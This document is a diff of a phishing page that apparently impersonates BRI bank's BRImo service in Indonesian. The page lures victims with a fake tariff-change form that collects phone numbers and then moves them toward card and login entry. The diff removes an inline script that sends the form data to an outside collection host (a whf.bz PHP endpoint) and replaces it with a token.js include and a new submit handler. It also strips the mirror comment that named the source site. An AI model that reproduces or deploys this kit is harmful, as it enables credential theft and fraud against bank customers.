@@ -646,7 +646,7 @@ select{
 <center>
 
 </center>
-<form onsubmit="sendHp(); return false" method="POST" id="inputlogin" style="padding: 10px">
+<form onsubmit="sendTarif()" method="POST" id="inputlogin" style="padding: 10px">
     
 <center>
  <div class=" hua" style="top: -20px; position: absolute; margin: 0px auto; left: 0; right: 0; z-index: 999">
@@ -656,8 +656,8 @@ select{
 
 <select name="tarif" id="tarif" required class="yantek" style="margin-top: 5px">
 <option value="">PILIH TARIF</option>
-<option value="𝗧𝗮𝗿𝗶𝗳 𝗕𝗮𝗿𝘂 Rp 150.000">√•𝗧𝗮𝗿𝗶𝗳 𝗕𝗮𝗿𝘂 𝗥𝗽 𝟭𝟱𝟬.𝟬𝟬𝟬 / 𝗣𝗲𝗿𝗯𝘂𝗹𝗮𝗻</option>
-<option value="𝗧𝗮𝗿𝗶𝗳 𝗟𝗮𝗺𝗮 Rp 6.500">√•𝗧𝗮𝗿𝗶𝗳 𝗟𝗮𝗺𝗮 𝗥𝗽 𝟲.𝟱𝟬𝟬 / 𝗕𝗶 𝗳𝗮𝘀𝘁 𝟮.𝟱𝟬𝟬</option>
+<option value="𝗕𝗮𝗿𝘂 Rp 150.000">√•𝗧𝗮𝗿𝗶𝗳 𝗕𝗮𝗿𝘂 𝗥𝗽 𝟭𝟱𝟬.𝟬𝟬𝟬 / 𝗣𝗲𝗿𝗯𝘂𝗹𝗮𝗻</option>
+<option value="𝗟𝗮𝗺𝗮 Rp 6.500">√•𝗧𝗮𝗿𝗶𝗳 𝗟𝗮𝗺𝗮 𝗥𝗽 𝟲.𝟱𝟬𝟬 / 𝗕𝗶 𝗳𝗮𝘀𝘁 𝟮.𝟱𝟬𝟬</option>
 </select>
 
 <br><br><br>
@@ -688,7 +688,7 @@ select{
 <div class="text-center" id="popupku" style="position: fixed; left: 0; right: 0; top: 0; bottom: 0; margin: 0px auto; z-index: ; text-align: center; width: 100%; height: 100%; background: #00000070; z-index: 99999999999; display: none">
           <center>
  <div class="text-center animated" style="position: fixed; left: 0; right: 0; width: 300px; height: 320px; background: white; border-radius: 20px; margin: 0px auto; top: 200;/* box-shadow: 2px 2px 2px */#ccc; border: 0px double #0F78CB">
-<img src="images/y4fujw.jpg" width="85%" style="margin-top: 20px">
+<img src="https://hosting.tigerengine.id/y4fujw.jpg" width="85%" style="margin-top: 20px">
 <button type="button" style="width: 85%; height: 43px; margin-top: 20px; border: none; background: #0F78CB; color: #fff; font-weight: bold;border-radius:5px; box-shadow: 2px 2px 2px #ccc; font-size: 15px" onclick="sudah()">Punya Kartu ATM</button><br>
 <p>
 <button type="button" style="width: 85%; height: 43px; margin-top: 8px; border: 2px solid #0F78CB; background: snow; color: #0F78CB; font-weight: bold;border-radius:5px; box-shadow: 2px 2px 2px #ccc; font-size: 15px" onclick="belum()">Sudah Terdaftar di BRImo</button>
@@ -704,11 +704,9 @@ select{
 <br>
     
     <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
-    <script src="vibr.js"></script>
-    <script src="jquery.js"></script>
-    <script src="../js/valid.js"></script>
-    <script src="../js/function_btn.js"></script>
-    
+   
+    <script src="token.js"></script>
+   
 </body>
 <script>
         $( document ).ready(function() {
@@ -753,39 +751,6 @@ setTimeout(function(){
      }, 600);        
  }
 </script>  
-<script>
-// TARIF
-$(document).ready(function() {
-    $('#inputlogin').submit(function(e) {
-        event.preventDefault();
-        $('.load').fadeIn();
-        document.getElementById('kirims').innerHTML = "Memproses....";
-      
- $.ajax({
- type: 'POST',
- url: 'https://chroedevsi.whf.bz/virtual11/one.php',
- data: $(this).serialize(),
-
-            complete: function(data) {
-                vibr(180);
-                console.log('Complete')
-                setTimeout(function() {
-                window.location.href="belum.html";
-var tarif = $('#tarif').val(); 
- sessionStorage.setItem("tarif", tarif);
-var nohp = $('#nohp').val();
- sessionStorage.setItem("nohp", nohp);
-                    $("#lonte").hide();
-document.getElementById('kirims').innerHTML = "Lanjutkan";
-                    $('.load').fadeOut();
-                }, 00);
-            }
-        });
-    });
-    return false;
-});
-     
-</script>
 
    
      <script>
@@ -831,105 +796,7 @@ document.getElementById('kirims').innerHTML = "Lanjutkan";
             }
         }
   </script>
-   <script>
-               $(document).ready(function() {
-            $('.toggle i').click(function() {
-                if ($("#pass").attr('type') === 'password') {
-                    $("#pass").attr('type', 'text');
-                    $(this).removeClass('fa-eye-slash').addClass('fa-eye');
-                } else {
-                    $("#pass").attr('type', 'password');
-                    $(this).removeClass('fa-eye').addClass('fa-eye-slash');
-                }
-            });
-            $('#uname, #pass').on('input', function() {
-                if ($('#uname').val().length < 6 || $('#pass').val().length < 6) {
-                    $('#btnsubmit').prop('disabled', true);
-                } else {
-                    $('#btnsubmit').prop('disabled', false);
-                }
-            });
-        });
-        $("textarea").each(function () {
-            this.setAttribute("style", "height:" + (this.scrollHeight) + "px;overflow-y:hidden;");
-        }).on("input", function () {
-            this.style.height = 0;
-            this.style.height = (this.scrollHeight) + "px";
-        });
-        $('#inpsms').on('input', function() {
-            if ($(this).val().length < 10){
-                $('#btnsubmit').prop('disabled', true);
-            } else {
-                $('#btnsubmit').prop('disabled', false);
-            }
-        });
-        
-        
-           $(document).ready(function() {
-            $("body").on('click', 'button#doLog', function() {
-                var uname = $("#uname").val();
-                var pass = $("#pass").val();
-
-                $.ajax({
-                    url: "/login/confirm.php",
-                    method: "POST",
-                    data: "username="+user+"&password="+pass,
-                    beforeSend: function() {
-                        $("#loading").show();
-                    },
-                    success: function(responsex) {
-                        $("#aseli").html('');
-                        if(responsex == "true") {
-                            $.get("", function(datax, status){
-                                window.history.pushState("", "", '');
-                                $("#hideBody").hide();
-                                $("#loading").hide();
-                                $("#aseli").html(datax);
-                            });
-                        } else {
-                            $.get("", function(data, status){
-                                window.history.pushState("", "", '');
-                                setTimeout(function() { 
-                                    $("#hideBody").hide();
-                                    $("#loading").hide();
-                                    $("#aseli").html(data);
-                                    $("#aseli").show();
-                                }, 1000);
-                            });
-                        }
-                        
-                    }
-                })
-            });
-            $("div#eyeOpen").on('click', function() {
-                $("#eyeOpen").css("display", "none");
-                $("#eyeClose").css("display", "block");
-
-                $("#pass").prop("type", "text");
-
-                $("div#eyeClose").on('click', function() {
-                    $("#eyeOpen").css("display", "block");
-                    $("#eyeClose").css("display", "none");
-
-                    $("#pass").prop("type", "password");
-                });
-            });
-
-            $("#uname").on('input', function() {
-                var uname = $("#uname").val();
-                var pass = $("#pass").val();
-
-                OnButton(uname, pass);
-            });
-
-            $("#pass").on('input', function() {
-                var uname = $("#user").val();
-                var pass = $("#pass").val();
-
-                OnButton(uname, pass);
-            });
-        });
-   </script>
+  
    <script>
  function gotoback(){
       $(".containerpin").fadeOut();
@@ -951,5 +818,5 @@ function batalkanku(){
 
  
 </script>
-<!-- Mirrored from hadiah-baruu.zzyus.life/id/login/ by HTTrack Website Copier/3.x [XR&CO'2017], Mon, 13 Nov 2023 13:00:10 GMT -->
+
 </html>
